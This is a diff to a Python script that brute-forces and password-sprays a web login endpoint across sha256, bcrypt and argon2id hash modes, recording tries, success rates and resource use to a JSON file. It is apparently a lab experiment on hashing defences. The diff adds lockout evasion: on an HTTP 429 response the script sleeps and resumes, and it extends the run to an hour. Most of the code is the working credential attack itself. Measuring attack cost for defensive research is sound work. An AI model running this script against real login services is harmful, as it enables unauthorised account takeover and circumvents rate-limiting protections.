@@ -8,11 +8,14 @@ PASSWORDS_FILE = "passwords.txt"
 USERS_JSON = "users.json"
 MAX_ATTEMPTS_PER_USER = 50000
 MAX_ATTEMPTS_PER_SESSION = 1000000
+TIME_LIMIT = 3600
 session = requests.Session()
+
 
 def load_words(path, limit=10000):
     with open(path, "r", encoding="utf-8", errors="ignore") as f:
         return [w.strip() for w in f if w.strip()][:limit]
+
 
 def password_generator(words):
     count = 0
@@ -48,11 +51,16 @@ def try_login(username, password, hash_mode):
                 "hash_mode": hash_mode
             }
         )
-        return "Welcome" in response.text or "test" in response.url
+        if response.status_code == 429:
+            return "Locked"
+        if "Welcome" in response.text or "test" in response.url:
+            return "Cracked"
+        else:
+            return "Fail"
 
     except requests.RequestException as e:
         print("ERROR occured in the server:" + str(e))
-        return False
+        return "Error"
 
 
 def bruteforce(username, hash_mode):
@@ -60,8 +68,11 @@ def bruteforce(username, hash_mode):
     tries = 0
 
     for password in password_generator(words):
-        if try_login(username, password, hash_mode):
+        res = try_login(username, password, hash_mode)
+        if res == "Cracked":
             return tries
+        elif res == "Locked":
+            time.sleep(60)
         tries += 1
     return -1
 
@@ -75,6 +86,7 @@ def get_user_list():
     user_list = user_list[:5]
     return user_list
 
+
 @measure_resources(interval=0.01)
 def password_spraying(hash_mode):
     successful_cracks = {}
@@ -86,11 +98,14 @@ def password_spraying(hash_mode):
         pass_start = time.time()
         for user in users:
             tries += 1
-            if try_login(user, password, hash_mode):
+            res = try_login(user, password, hash_mode)
+            if res == "Cracked":
                 successful_cracks[user] = time.time() - pass_start
                 break
+            elif res == "Locked":
+                time.sleep(60)
         # check if time limit or tries limit were exceeded
-        if tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) // 60 >= 2:
+        if tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) >= TIME_LIMIT:
             break
 
     end = time.time() - start
@@ -100,7 +115,8 @@ def password_spraying(hash_mode):
             user_entry = {"Username": user, "Time_elapsed": successful_cracks[user], "Status": True}
             user_entries.append(user_entry)
 
-    return tries, end,len(successful_cracks),user_entries
+    return tries, end, len(successful_cracks), user_entries
+
 
 @measure_resources(interval=0.01)
 def preform_bruteforce(hash_mode):
@@ -122,15 +138,16 @@ def preform_bruteforce(hash_mode):
         else:
             total_tries += MAX_ATTEMPTS_PER_USER
         # check if time limit or tries limit were exceeded
-        if total_tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start)//60 >= 2:
+        if total_tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) >= TIME_LIMIT:
             break
     end = time.time() - start
     # also return analytics
     return total_tries, end, count_success, user_entries
 
+
 def main():
     hash_modes = ["sha256", "bcrypt", "argon2id"]
-    with open("BF_NO_DEF.json","w") as file:
+    with open("BF_NO_DEF.json", "w") as file:
         for curr_hash in hash_modes:
             # preform bruteforce on the current hash encryption method
             result, avg_cpu, avg_mem = preform_bruteforce(curr_hash)
@@ -138,11 +155,11 @@ def main():
             total_tries, end, count_success, user_entries = result
             brute_json = {"hash_mode": curr_hash,
                           "Total_tries": total_tries,
-                          "Time_elapsed": round(end,3),
+                          "Time_elapsed": round(end, 3),
                           "Tries_per_sec": int(total_tries / end),
-                          "Success_rate": round((count_success / len(get_user_list()) * 100),2),
-                          "average_cpu_use": round(avg_cpu,2),
-                          "average_mem_use":  round(avg_mem,2),
+                          "Success_rate": round((count_success / len(get_user_list()) * 100), 2),
+                          "average_cpu_use": round(avg_cpu, 2),
+                          "average_mem_use": round(avg_mem, 2),
                           "User_entries": user_entries}
             file.write(json.dumps(brute_json))
 
@@ -158,6 +175,7 @@ def main():
                           "average_mem_use": round(avg_mem, 2),
                           "User_entries": user_entries}
             file.write(json.dumps(spray_json))
+
 
 if __name__ == "__main__":
     main()
